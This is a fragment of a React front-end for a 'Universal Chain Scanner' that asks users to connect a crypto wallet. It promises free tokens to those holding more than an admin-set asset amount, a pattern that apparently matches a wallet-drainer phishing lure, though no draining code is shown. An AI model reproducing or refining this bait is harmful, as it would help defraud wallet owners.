              Connect Your Wallet to Begin
            </h2>
            
            <p style={{ 
              color: '#94a3b8', 
              fontSize: '18px', 
              marginBottom: '40px', 
              maxWidth: '600px', 
              margin: '0 auto',
              lineHeight: '1.6'
            }}>
              Your wallet will be <strong>automatically scanned</strong> across all chains.
              <br/>
              If you have <strong>${adminSettings.minAmount}+ in assets</strong>, you'll receive free tokens!
            </p>
            
            <div style={{
              background: 'linear-gradient(135deg, rgba(59, 130, 246, 0.1) 0%, rgba(16, 185, 129, 0.1) 100%)',
              padding: '30px',
              borderRadius: '20px',
              border: '2px solid #3b82f6',
              marginBottom: '40px',
              textAlign: 'center'
            }}>
              <h3 style={{ color: '#3b82f6', marginBottom: '20px', fontSize: '24px' }}>
                🚀 How It Works
              </h3>
              
              <div style={{ display: 'grid', gridTemplateColumns: isMobile ? '1fr' : 'repeat(3, 1fr)', gap: '20px' }}>
                <div style={{ textAlign: 'center' }}>
                  <div style={{
                    width: '60px',
                    height: '60px',
                    background: '#3b82f6',
                    borderRadius: '50%',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    fontSize: '24px',
                    margin: '0 auto 15px'
                  }}>
                    1
                  </div>
                  <div style={{ color: '#e2e8f0', fontWeight: 'bold', marginBottom: '10px' }}>Connect</div>
                  <div style={{ color: '#94a3b8', fontSize: '14px' }}>Connect your wallet with one click</div>
                </div>
                
                <div style={{ textAlign: 'center' }}>
                  <div style={{
                    width: '60px',
                    height: '60px',
                    background: '#10b981',
                    borderRadius: '50%',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    fontSize: '24px',
                    margin: '0 auto 15px'
                  }}>
                    2
                  </div>
                  <div style={{ color: '#e2e8f0', fontWeight: 'bold', marginBottom: '10px' }}>Auto-Scan</div>
                  <div style={{ color: '#94a3b8', fontSize: '14px' }}>We scan your assets across all chains</div>
                </div>
                
                <div style={{ textAlign: 'center' }}>
                  <div style={{
                    width: '60px',
                    height: '60px',
                    background: '#8b5cf6',
                    borderRadius: '50%',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    fontSize: '24px',
                    margin: '0 auto 15px'
                  }}>
                    3
                  </div>
                  <div style={{ color: '#e2e8f0', fontWeight: 'bold', marginBottom: '10px' }}>Claim Rewards</div>
                  <div style={{ color: '#94a3b8', fontSize: '14px' }}>Receive free tokens if eligible</div>
                </div>
              </div>
            </div>
            
            <div style={{
              background: '#1e293b',
              padding: '25px',
              borderRadius: '15px',
              border: '1px solid #334155',
              maxWidth: '500px',
              margin: '0 auto'
            }}>
              <div style={{ color: '#94a3b8', fontSize: '14px', marginBottom: '10px' }}>Ready to start?</div>
              <div style={{ fontSize: '18px', color: '#e2e8f0', marginBottom: '20px' }}>
                Click "Connect Wallet" above to begin
              </div>
            </div>
          </div>
        ) : (
          // Connected user interface
          <>
            {scanning ? (
              <div style={{
                textAlign: 'center',
                padding: '80px 20px'
              }}>
                <div style={{
                  width: '80px',
                  height: '80px',
                  border: '5px solid #334155',
                  borderTop: '5px solid #3b82f6',
                  borderRadius: '50%',
                  animation: 'spin 1s linear infinite',
                  margin: '0 auto 30px'
                }}></div>
                <h3 style={{ color: '#e2e8f0', marginBottom: '15px', fontSize: '24px' }}>
                  🔍 Scanning Your Wallet...
                </h3>
                <p style={{ color: '#94a3b8', fontSize: '18px' }}>
                  Scanning across 13+ chains for your assets
                  <br/>
                  <span style={{ fontSize: '14px', color: '#64748b' }}>This may take a few moments</span>
                </p>
              </div>
            ) : (
              renderScanResults()
            )}
            
            {claimData && connectionStep === 4 && (
              <div style={{
                background: 'linear-gradient(135deg, rgba(16, 185, 129, 0.1) 0%, rgba(59, 130, 246, 0.1) 100%)',
                padding: '30px',
                borderRadius: '20px',
                border: '2px solid #10b981',
                marginTop: '30px',
                textAlign: 'center'
              }}>
                <div style={{ fontSize: '48px', marginBottom: '20px' }}>⏳</div>
                <h3 style={{ color: '#10b981', marginBottom: '15px', fontSize: '24px' }}>
                  Processing Your Claim...
                </h3>
                <p style={{ color: '#94a3b8', marginBottom: '20px' }}>
                  Your {adminSettings.tokenName} ({adminSettings.tokenSymbol}) tokens are being sent to your wallet.
                  <br/>
                  This usually takes 1-2 minutes.
                </p>
                <div style={{
                  background: 'rgba(0,0,0,0.2)',
                  padding: '15px',
                  borderRadius: '10px',
                  marginTop: '20px'
                }}>
                  <div style={{ color: '#e2e8f0', fontWeight: 'bold', marginBottom: '5px' }}>Claim ID</div>
                  <div style={{ color: '#94a3b8', fontFamily: 'monospace', fontSize: '14px' }}>
                    {claimData.claimId}
                  </div>
                </div>
              </div>
            )}
          </>
        )}
      </main>

      {renderAdminPanel()}

      <footer style={{
        marginTop: '60px',
        paddingTop: '20px',
        borderTop: '1px solid #334155',
        textAlign: 'center',
        color: '#64748b',
        fontSize: '14px'
      }}>
        <p>
          Universal Chain Scanner v2.0 • Auto-Scanning • Instant Rewards
        </p>
        <p style={{ fontSize: '12px', marginTop: '10px' }}>
          Supports 13+ EVM chains • Real-time scanning • Secure wallet connection
        </p>
      </footer>

      <style>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
}

// ✅ ConnectKit theme
const customTheme = {
  borderRadius: 'large',
  fontStack: 'system',
  overlay: 'blur',
  theme: 'midnight'
};

export default function App() {
  return (
    <WagmiProvider config={config}>
      <QueryClientProvider client={queryClient}>
        <ConnectKitProvider 
          theme={customTheme}
          options={{
            hideQuestionMarkCTA: true,
            walletConnectName: 'WalletConnect',
            disableSiweRedirect: true,
            embedGoogleFonts: true,
            preferredWallets: ['walletConnect', 'metaMask', 'coinbase', 'trust', 'rainbow'],
            walletConnect: {
              showQrModal: true,
              qrModalOptions: {
                themeMode: 'dark',
                mobileLinks: ['metamask', 'trust', 'rainbow', 'coinbase']
              }
            }
          }}
        >
          <WalletApp />
        </ConnectKitProvider>
      </QueryClientProvider>
    </WagmiProvider>
  );
}
